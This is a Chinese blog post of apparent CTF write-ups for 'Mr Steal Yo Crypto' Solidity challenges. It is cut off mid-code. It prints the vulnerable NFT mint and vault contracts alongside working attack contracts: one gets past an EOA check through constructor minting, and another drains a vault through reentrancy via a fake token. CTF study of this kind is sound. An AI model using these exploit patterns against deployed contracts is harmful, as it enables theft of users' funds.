<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Steal Crypto | lsq</title><meta name="author" content="lsq"><meta name="copyright" content="lsq"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Mr Steal Yo Crypto 题解1.Jpeg SniperHopegs NFT 市场即将推出大肆宣传的 NFT 收藏战利品。他们有一个包装合同：FlatLaunchpeg，负责处理该系列的公开销售铸币厂。你的任务是绕过他们的保护措施，在一次 tx 中最大限度地铸造整个系列。   NFT代码 contract BaseLaunchpegNFT is ERC721, Ownable &amp;#12">
<meta property="og:type" content="article">
<meta property="og:title" content="Steal Crypto">
<meta property="og:url" content="http://example.com/2022/11/26/crypto/index.html">
<meta property="og:site_name" content="lsq">
<meta property="og:description" content="Mr Steal Yo Crypto 题解1.Jpeg SniperHopegs NFT 市场即将推出大肆宣传的 NFT 收藏战利品。他们有一个包装合同：FlatLaunchpeg，负责处理该系列的公开销售铸币厂。你的任务是绕过他们的保护措施，在一次 tx 中最大限度地铸造整个系列。   NFT代码 contract BaseLaunchpegNFT is ERC721, Ownable &amp;#12">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2018-10-26%2F5bd2cf1873f75.jpg&refer=http%3A%2F%2Fpic1.win4000.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672059133&t=52c973f7c56ace492c2a4e392b7595a3">
<meta property="article:published_time" content="2022-11-26T11:47:06.000Z">
<meta property="article:modified_time" content="2023-07-18T12:30:11.657Z">
<meta property="article:author" content="lsq">
<meta property="article:tag" content="标签1">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2018-10-26%2F5bd2cf1873f75.jpg&refer=http%3A%2F%2Fpic1.win4000.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672059133&t=52c973f7c56ace492c2a4e392b7595a3"><link rel="shortcut icon" href="https://img2.baidu.com/it/u=3673566212,1440065658&fm=253&fmt=auto&app=138&f=PNG?w=751&h=500"><link rel="canonical" href="http://example.com/2022/11/26/crypto/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Steal Crypto',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-07-18 20:30:11'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/construct.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
<link rel="stylesheet" href="https://www.fomal.cc/static/css/runtime.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img0.baidu.com/it/u=1478036750,1488409170&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=800&amp;h=500" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2018-10-26%2F5bd2cf1873f75.jpg&amp;refer=http%3A%2F%2Fpic1.win4000.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1672059133&amp;t=52c973f7c56ace492c2a4e392b7595a3')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">lsq</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><!--span=' '+_p('search.title')--></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Steal Crypto</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-11-26T11:47:06.000Z" title="Created 2022-11-26 19:47:06">2022-11-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-07-18T12:30:11.657Z" title="Updated 2023-07-18 20:30:11">2023-07-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/solidity-learning/">solidity learning</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">5.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>29min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Steal Crypto"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Mr-Steal-Yo-Crypto-题解"><a href="#Mr-Steal-Yo-Crypto-题解" class="headerlink" title="Mr Steal Yo Crypto 题解"></a>Mr Steal Yo Crypto 题解</h1><h2 id="1-Jpeg-Sniper"><a href="#1-Jpeg-Sniper" class="headerlink" title="1.Jpeg Sniper"></a>1.Jpeg Sniper</h2><p>Hopegs NFT 市场即将推出大肆宣传的 NFT 收藏战利品。<br>他们有一个包装合同：FlatLaunchpeg，负责处理该系列的公开销售铸币厂。<br>你的任务是绕过他们的保护措施，在一次 tx 中最大限度地铸造整个系列。  </p>
<p>NFT代码</p>
<pre><code>contract BaseLaunchpegNFT is ERC721, Ownable &#123;

    using Counters for Counters.Counter;
    Counters.Counter private _tokenId;

    uint256 public collectionSize;
    uint256 public maxBatchSize;
    uint256 public salePrice; // free mint
    uint256 public maxPerAddressDuringMint;
    uint256 public publicSaleStartTime;

    modifier isEOA() &#123;
        uint256 size;
        address sender = msg.sender;

        assembly &#123;
            size := extcodesize(sender)
        &#125;

        if (size &gt; 0) revert Launchpeg__Unauthorized();
        _;
    &#125;

    constructor(
        uint256 _collectionSize,
        uint256 _maxBatchSize,
        uint256 _maxPerAddressDuringMint
    ) ERC721(&#39;BOOTY&#39;,&#39;BOOTY&#39;) &#123;
        collectionSize = _collectionSize;
        maxBatchSize = _maxBatchSize;
        maxPerAddressDuringMint = _maxPerAddressDuringMint;
        publicSaleStartTime = block.timestamp; // mint turned on this block
    &#125;

    /// @notice Returns the number of NFTs minted by a specific address
    /// @param _owner The owner of the NFTs
    /// @return numberMinted Number of NFTs minted
    function numberMinted(address _owner)
        public
        view
        returns (uint256)
    &#123;
        return balanceOf(_owner);
    &#125;

    /// @dev returns the total amount minted
    function totalSupply() public view returns (uint256) &#123;
        return _tokenId.current();
    &#125;

    /// @dev mints n number of NFTs per user
    function _mintForUser(address to, uint256 quantity) internal &#123;
        for (uint256 i=0; i&lt;quantity; i++) &#123;
            _mint(to, _tokenId.current());
            _tokenId.increment();
        &#125;
    &#125;

    /// @dev Verifies that enough funds have been sent by the sender and refunds the extra tokens if any
    /// @param _price The price paid by the sender for minting NFTs
    function _refundIfOver(uint256 _price) internal &#123;
        if (msg.value &lt; _price) &#123;
            revert Launchpeg__NotEnoughFunds(msg.value);
        &#125;
        if (msg.value &gt; _price) &#123;
            (bool success, ) = msg.sender.call&#123;value: msg.value - _price&#125;(&quot;&quot;);
            if (!success) &#123;
                revert Launchpeg__TransferFailed();
            &#125;
        &#125;
    &#125;

&#125;
</code></pre><p>包装合同  </p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import &quot;./BaseLaunchpegNFT.sol&quot;;


/// @dev hopegs NFT exchange wrapper to manage mint
contract FlatLaunchpeg is BaseLaunchpegNFT &#123;

    enum Phase &#123;
        NotStarted,
        PublicSale
    &#125;

    modifier atPhase(Phase _phase) &#123;
        if (currentPhase() != _phase) &#123;
            revert Launchpeg__WrongPhase();
        &#125;
        _;
    &#125;

    constructor(
        uint256 _collectionSize,
        uint256 _maxBatchSize,
        uint256 _maxPerAddressDuringMint
    ) BaseLaunchpegNFT(
        _collectionSize,
        _maxBatchSize,
        _maxPerAddressDuringMint
    ) &#123;&#125;

    /// @notice Mint NFTs during the public sale
    /// @param _quantity Quantity of NFTs to mint
    function publicSaleMint(uint256 _quantity)
        external
        payable
        isEOA
        atPhase(Phase.PublicSale)
    &#123;
        if (numberMinted(msg.sender) + _quantity &gt; maxPerAddressDuringMint) &#123;
            revert Launchpeg__CanNotMintThisMany();
        &#125;
        if (totalSupply() + _quantity &gt; collectionSize) &#123;
            revert Launchpeg__MaxSupplyReached();
        &#125;
        uint256 total = salePrice * _quantity;

        _mintForUser(msg.sender, _quantity);
        _refundIfOver(total);
    &#125;

    /// @notice Returns the current phase
    /// @return phase Current phase
    function currentPhase() public view returns (Phase) &#123;
        if (
            publicSaleStartTime == 0 ||
            block.timestamp &lt; publicSaleStartTime
        ) &#123;
            return Phase.NotStarted;
        &#125; else &#123;
            return Phase.PublicSale;
        &#125;
    &#125;

&#125;
</code></pre><p>我们如果想要铸造nft，仅能通过publicSaleMint一个方法，但是一个地址最多只能铸造5个代币，改方法有isEOA检验，只有地址代码长度为零才能调用，并且我们要在一次事务中取得所有代币（69个）<br>可以想到，如果合约在构造函数中调用publicSaleMint方法，那么由于合约还未初始化完成，代码长度就为0，可以通过isEOA检验。那么我们要通过一次事务就铸造完毕，就必须将功能拆分，用子合约用于铸造，主合约要多次创建子合约  </p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import &quot;./FlatLaunchpeg.sol&quot;;

contract minter&#123;
    address NFT;
    address attacker;
    constructor(address _NFT,address _attacker)&#123;
        NFT = _NFT;
        attacker = _attacker;
        mint();
    &#125;

    function mint() public &#123;
        uint per = 5;

        for(uint amount = 0;amount&lt;=60;)&#123;
            new minten(NFT,attacker,per,amount);
            amount = amount+5;
        &#125;//此时，已经铸造了65个
        new minten(NFT,attacker,4,65);//再铸造四个
    &#125;
&#125;

contract minten&#123;
    constructor(address _nft,address attacker,uint per,uint amount)&#123;
        FlatLaunchpeg nft = FlatLaunchpeg(_nft);
        nft.publicSaleMint(per);//铸造per个
        for(uint i = 0;i&lt;per;i++)&#123;
            nft.transferFrom(address(this), attacker, amount+i);//转给attacker
        &#125;
    &#125;
&#125;
</code></pre><p>测试<br>    it(“solves the challenge”, async function () {</p>
<pre><code>let minterFactory = await ethers.getContractFactory(&#39;minter&#39;);
let minter = await minterFactory.connect(attacker).deploy(flatLaunchpeg.address,await attacker.getAddress());

&#125;);
</code></pre><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="1.png" alt="1"></p>
<h2 id="safu-vault"><a href="#safu-vault" class="headerlink" title="safu-vault"></a>safu-vault</h2><p>Safu Labs刚刚发布了他们的SafuVault，这是有史以来“最安全”的收益产生金库，或者他们的Twitter帐户是这样说的。<br>他们的SafuVault预计存入USDC，并且已经从用户那里获得了10，000 USDC。<br>你知道演习，耗尽资金（至少90%）。您从 10，000 USDC 开始。</p>
<p>金库代币合约<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;
import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;
import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;
import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;
import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;


/// @dev interface for interacting with the strategy
interface IStrategy &#123;
    function want() external view returns (IERC20);
    function beforeDeposit() external;
    function deposit() external;
    function withdraw(uint256) external;
    function balanceOf() external view returns (uint256);
&#125;

/// @dev safu yield vault with automated strategy
contract SafuVault is ERC20, Ownable, ReentrancyGuard &#123;

    using SafeERC20 for IERC20;

    // The strategy currently in use by the vault.
    IStrategy public strategy;

    constructor (
        IStrategy _strategy,
        string memory _name,
        string memory _symbol
    ) ERC20 (
        _name,
        _symbol
    ) &#123;
        strategy = IStrategy(_strategy);
    &#125;

    /// @dev token required as input for this strategy
    function want() public view returns (IERC20) &#123;
        return IERC20(strategy.want());
    &#125;

    /// @dev calculates amount of funds available to put to work in strategy
    function available() public view returns (uint256) &#123;
        return want().balanceOf(address(this));
    &#125;

    /// @dev calculates total underlying value of tokens held by system (vault+strategy)
    function balance() public view returns (uint256) &#123;
        return available()+strategy.balanceOf();
    &#125;

    /// @dev calls deposit() with all the sender&#39;s funds
    function depositAll() external &#123;
        deposit(want().balanceOf(msg.sender));
    &#125;

    /// @dev entrypoint of funds into the system
    /// @dev people deposit with this function into the vault
    function deposit(uint256 _amount) public nonReentrant &#123;
        strategy.beforeDeposit();

        uint256 _pool = balance();
        want().safeTransferFrom(msg.sender, address(this), _amount);
        earn();
        uint256 _after = balance();
        _amount = _after - _pool; // Additional check for deflationary tokens

        uint256 shares;
        if (totalSupply() == 0) &#123;
            shares = _amount;
        &#125; else &#123;
            shares = (_amount * totalSupply()) / (_pool);
        &#125;
        _mint(msg.sender, shares);
    &#125;

    /// @dev sends funds to strategy to put them to work, by calling deposit() function
    function earn() public &#123;
        uint256 _bal = available();
        want().safeTransfer(address(strategy), _bal);
        strategy.deposit();
    &#125;

    /// @dev helper function to call withdraw() with all sender&#39;s funds
    function withdrawAll() external &#123;
        withdraw(balanceOf(msg.sender));
    &#125;

    /// @dev allows user to withdraw specified funds
    function withdraw(uint256 _shares) public &#123;
        uint256 r = (balance() * _shares) / (totalSupply());
        _burn(msg.sender, _shares); // will revert if _shares &gt; what user has

        uint256 b = want().balanceOf(address(this)); // check vault balance
        if (b &lt; r) &#123; // withdraw any extra required funds from strategy
            uint256 _withdraw = r - b;
            strategy.withdraw(_withdraw);
            uint256 _after = want().balanceOf(address(this));
            uint256 _diff = _after - b;
            if (_diff &lt; _withdraw) &#123;
                r = b + _diff;
            &#125;
        &#125;

        want().safeTransfer(msg.sender, r);
    &#125;

    /// @dev deposit funds into the system for other user
    function depositFor(
        address token, 
        uint256 _amount, 
        address user
    ) public &#123;
        strategy.beforeDeposit();

        uint256 _pool = balance();
        IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);
        earn();
        uint256 _after = balance();
        _amount = _after - _pool; // Additional check for deflationary tokens

        uint256 shares;
        if (totalSupply() == 0) &#123;
            shares = _amount;
        &#125; else &#123;
            shares = (_amount * totalSupply()) / (_pool);
        &#125;
        _mint(user, shares);
    &#125;

&#125;
</code></pre><p>金库储存合约</p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;
import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;
import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;
import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;
import &quot;@openzeppelin/contracts/security/Pausable.sol&quot;;


/// @dev safu yield generation strategy
/// @dev this strategy takes in &#123;want&#125; &amp; generates &#123;want&#125; using its yield generator
/// @dev the yield generator is abstracted away bc it&#39;s not relevant to the exploit
/// @dev therefore you will see unimplemented logic for interacting w/ the generator
contract SafuStrategy is Ownable, Pausable &#123;

    using SafeERC20 for IERC20;
    using Address for address;

    address public want; // deposit &amp; withdrawal token
    address public vault; // safu vault

    mapping (address =&gt; bool) public whitelist;

    modifier onlyWhitelisted() &#123;
        require(whitelist[msg.sender] == true, &quot;not whitelisted&quot;);
        _;
    &#125;

    constructor(
        address _want
    ) &#123;
        want = _want;
        whitelist[msg.sender] = true;
    &#125;

    /// @dev set the vault associated w/ this strategy
    function setVault(address _vault) external onlyOwner &#123;
        require(vault == address(0), &quot;vault set&quot;);
        vault = _vault;
    &#125;

    /// @dev functionality for updating the whitelist
    function addOrRemoveFromWhitelist(
        address add, 
        bool isAdd
    ) public onlyOwner &#123;
        whitelist[add] = isAdd;
    &#125; 

    /// @dev puts the funds to work
    /// @dev called whenever someone deposits into this strategy&#39;s vault contract
    function deposit() public whenNotPaused &#123;
        // takes in the deposited funds &amp; puts in yield generator
        // ...
    &#125;

    /// @dev withdraws &#123;want&#125; and sends it to the vault
    /// @param _amount How much &#123;want&#125; to withdraw.
    function withdraw(uint256 _amount) external &#123;
        require(msg.sender == vault, &quot;not vault&quot;);

        uint256 wantBal = IERC20(want).balanceOf(address(this));

        if (wantBal &lt; _amount) &#123;
            // withdraws funds depositied into yield generator &amp; sends back to this address
            // ...
            wantBal = IERC20(want).balanceOf(address(this));
        &#125;

        if (wantBal &gt; _amount) &#123;
            wantBal = _amount;
        &#125;

        IERC20(want).safeTransfer(vault, wantBal); 
    &#125;

    /// @dev handles required functionality before vault deposits to strategy
    function beforeDeposit() external virtual &#123;
        uint256 wantBal = IERC20(want).balanceOf(address(this));

        if (wantBal &gt; 0) &#123;
            deposit();
            sellHarvest();
        &#125;
    &#125; 

    /// @dev runs a single instance of harvesting
    function harvest() external whenNotPaused onlyWhitelisted &#123;
        require(!Address.isContract(msg.sender), &quot;is contract&quot;);
        sellHarvest();
        deposit(); // places harvested funds back into the yield generator
    &#125;

    /// @dev harvests &#123;want&#125; from the yield generator
    function sellHarvest() internal &#123;
        // gathers all harvested funds from the yield generator &amp; converts to &#123;want&#125;
        // ...
    &#125;

    /// @dev calculates the total underlying &#123;want&#125; held by this strategy
    /// @dev takes into account funds at hand + funds allocated in yield generator
    /// @dev HOWEVER yield generator is abstracted so it is ignored here (0)
    function balanceOf() public view returns (uint256) &#123;
        return balanceOfWant()+0; // yield generator balance is 0
    &#125;

    /// @dev returns balance of &#123;want&#125; in this contract
    function balanceOfWant() public view returns (uint256) &#123;
        return IERC20(want).balanceOf(address(this));
    &#125;

    /// @dev pauses strategy
    function pause() public onlyOwner &#123;
        _pause();
    &#125;

    /// @dev unpauses the strategy
    function unpause() external onlyOwner &#123;
        _unpause();
    &#125;

&#125;
</code></pre><p>分析两合约的关系，用户直接与金库代币合约交互，可以向金库里存usdc，金库代币合约把转入的usdc转入金库储存合约，然后根据存钱前后两合约的余额差量为用户铸造金库代币。如果金库中usdc数目增加，那么用户存入的usdc就会产生收益。<br>我们如何削减金库的usdc？<br>观察depositFor函数，它需要调用者传入token，然后调token的safetransFrom,如果这个token的safetransFrom是我们自己实现的，相当于我们可以在depositFor过程中再次调用deposit，而如果调用deposit的amount与外部depositFor的amount相同，那么相当于我们只传入了一次usdc代币，却铸造了两次金库代币<br>因此我们只需要实现safetransfrom就可以  </p>
<pre><code>// SPDX-License-Identifier: MIT
import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;
import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;
pragma solidity ^0.8.0;
interface vault&#123;
    function depositFor(
        address token, 
        uint256 _amount, 
        address user
    ) external;
    function depositAll() external ;
    function withdrawAll() external ;

&#125;

contract vaultattack&#123;
    address target;
    address attacker;
    address token;
    using SafeERC20 for IERC20;
    constructor(address _vault,address _attacker,address _token) public&#123;
        target = _vault;
        attacker = _attacker;
        token = _token;
    &#125;

    function attack(uint amount) public&#123;
        vault(target).depositFor(address(this), amount, address(this));
        vault(target).withdrawAll();
    &#125;
    function safeTransferFrom(
        address from,
        address to,
        uint256 value
    ) external &#123;
        IERC20(token).approve(to, value);
        vault(target).depositAll();
    &#125;

    function transfer1() public&#123;
        IERC20(token).transfer(attacker, IERC20(token).balanceOf(address(this)));
    &#125;

&#125;
</code></pre><p>调用attack之后，发现一直报错“SafeERC20: low-level call failed”<br>看了好久，发现如果我的攻击合约有fallback就不会报这个错<br>推测是我函数签名出现了问题<br>仔细看了下 safeERC20<br>发现他的safeTransFrom是这样的<br>    function safeTransferFrom(<br>            IERC20 token,<br>            address from,<br>            address to,<br>            uint256 value<br>        ) internal {<br>            _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));<br>        }</p>
<p>有一段注释  </p>
<ul>
<li>To use this library you can add a <code>using SafeERC20 for IERC20;</code> statement to your contract,  </li>
<li>which allows you to call the safe operations as <code>token.safeTransfer(...)</code>, etc.<br>这说明<br>IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);<br>这句话只的是调用IERC20的safeTransferFrom成员（因为using SafeERC20 for IERC20），第一个参数是token  所以我们真正要实现的是transferFrom  </li>
</ul>
<p>改正后的攻击合约<br>    // SPDX-License-Identifier: MIT<br>    import “@openzeppelin/contracts/token/ERC20/IERC20.sol”;<br>    import “@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol”;<br>    pragma solidity ^0.8.0;<br>    interface vault{<br>        function depositFor(<br>            address token,<br>            uint256 _amount,<br>            address user<br>        ) external;<br>        function depositAll() external ;<br>        function withdrawAll() external ;</p>
<pre><code>&#125;

contract vaultattack&#123;
    address target;
    address attacker;
    address token;
    using SafeERC20 for IERC20;
    constructor(address _vault,address _attacker,address _token) public&#123;
        target = _vault;
        attacker = _attacker;
        token = _token;
    &#125;

